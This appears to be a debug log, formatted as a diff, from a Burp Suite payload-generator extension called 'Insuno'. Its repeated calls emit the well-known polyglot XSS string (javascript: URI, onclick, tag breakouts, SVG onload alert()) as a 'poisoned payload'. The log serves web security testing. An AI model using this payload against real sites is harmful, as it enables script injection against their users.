+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@7b360998)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@7b360998, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@7b360998)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@7b360998, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@7b360998)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@7b360998, array('b'))
+
+
+('Insuno.getNextPayload.carga_formalizada', '')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.BurpExtender.createNewInstance', org.python.proxies.__main__$BurpExtender$0@65af5239, burp.bvw@372c1653)
+('Inicializacion Insuno desde Insuno.Insuno instanciado en ', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
+('Insuno.hasMorePayloads', org.python.proxies.__main__$Insuno$1@722e9ed2)
+
+
+('Insuno.getNextPayload', org.python.proxies.__main__$Insuno$1@722e9ed2, array('b', [120, 120, 120]))
+
+
+('Insuno.getNextPayload.carga_formalizada', 'xxx')
+('Insuno.getNextPayload.carga_envenenada', 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e\n')
+
+
